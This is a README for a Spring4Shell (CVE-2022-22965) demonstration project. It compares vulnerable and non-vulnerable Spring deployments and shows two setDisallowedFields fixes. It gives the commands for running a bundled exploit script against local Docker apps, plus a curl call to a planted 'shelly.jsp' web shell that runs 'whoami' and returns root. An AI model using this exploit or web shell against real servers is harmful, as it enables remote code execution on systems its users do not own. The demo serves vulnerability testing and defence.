# Spring4Shell RCE Demo for CVE-2022-22965
![MindMap](spring4shell_mindmap.drawio.png)

## Types of demo

1. spring-mvc (with spring-boot) deployed as a war to Apache Tomcat
2. spring-boot war with jsp, to be run as `java -jar`
3. spring-boot jar without jsp, to be run as `java -jar`

While the first spring-mvc in Apache Tomcat is vulnerable, the latter two types -- where spring-boot runs in 
Embedded Tomcat Servlet Container -- do not appear to be vulnerable. 
See also https://www.praetorian.com/blog/spring-core-jdk9-rce/

### Update 04/04/2022 
Initial rumors on the internet claimed that RestControllers where not impacted by this vulnerability but it appears 
that these are equally vulnerable. 

### Endpoints
The endpoints to test the application are:
- `/`, `/request`, `/rest/request`, `/safe-request` or `/rest/safe-request`
- `/get`, `/rest/get`
- `/post`, `/rest/post`
- `/put`, `/rest/put`

Lastly, `spring4shell-exploit.sh` is a standalone bash script for testing the exploit against any app.

### TODO
- implement POC for CVE-2022-22963 SpEL

## Run spring-mvc demo

To run the spring-mvc demo, the war file needs to be deployed to a Tomcat container.

For convenience, there is a pre-built docker container. Here is how see the exploit in action:
```
# Run a sample vulnerable app
$ docker run -p 8080:8080 --rm spring4shell

# Install and run the exploit
$ bash spring4shell-exploit.sh http://localhost:8080 spring4shell-rce/request

# Try manually running (after a small delay)
$ curl --fail -v --output - 'http://localhost:8080/shelly.jsp?pwd=PeekAboo&cmd=whoami'
> GET /shelly.jsp?pwd=PeekAboo&cmd=whoami HTTP/1.1
> Host: localhost:8080
> Accept: */*
> 
< HTTP/1.1 200 
< Content-Type: text/html;charset=ISO-8859-1
< Content-Length: 2291
< 
root
```

<br/>

The demo also contains two fixes.

One fix is to apply binder [setDisallowedFields() at controller level](https://github.com/dotnes/spring4shell/blob/main/spring4shell-spring-mvc/src/main/java/com/example/spring4shell/controller/SafeHelloWorldController.java#L22-L29):
```
# Run or restart the sample app.
$ docker run -p 8080:8080 --rm dotnes/spring4shell

# Try to install the exploit against safe controller. It should fail
# (Make sure the exploit was not previously installed)
$ bash spring4shell-exploit.sh http://localhost:8080 spring4shell/safe-helloworld

# Try manually running (after a small delay)
$ curl --fail -v --output - 'http://localhost:8080/shelly.jsp?pwd=PeekAboo&cmd=whoami'
curl: (22) The requested URL returned error: 404
```

Another fix is to apply [setDisallowedFields() with a controller advice](https://github.com/dotnes/spring4shell/blob/main/spring4shell-spring-mvc/src/main/java/com/example/spring4shell/controller/BinderControllerAdvice.java#L7-L20), for all controllers:
```
# Run or restart the sample app.
$ docker run -p 8080:8080 --rm -e APPLY_ADVICE=true spring4shell

# Install and run the exploit against unsafe controller. It should fail.
# (Make sure the exploit was not previously installed)
$ bash spring4shell-exploit.sh http://localhost:8080 spring4shell/request
curl: (22) The requested URL returned error: 404 
```

## Run spring-boot war with jsp

```
# Run a sample vulnerable app
$ docker run -p 8080:8080 --rm spring4shell-spring-boot-war

# Try to install the exploit. It should fail
$ bash spring4shell-exploit.sh http://localhost:8080 spring4shell/request
curl: (22) The requested URL returned error: 404
```

## Run spring-boot jar without jsp

```
# Run a sample vulnerable app
$ docker run -p 8080:8080 --rm spring4shell-spring-boot-jar

# Try to install the exploit. It should fail
$ bash spring4shell-exploit.sh http://localhost:8080 spring4shell/request
curl: (22) The requested URL returned error: 404
```

# Credits
Big shout out to @maxxedev for creating the foundation of this project.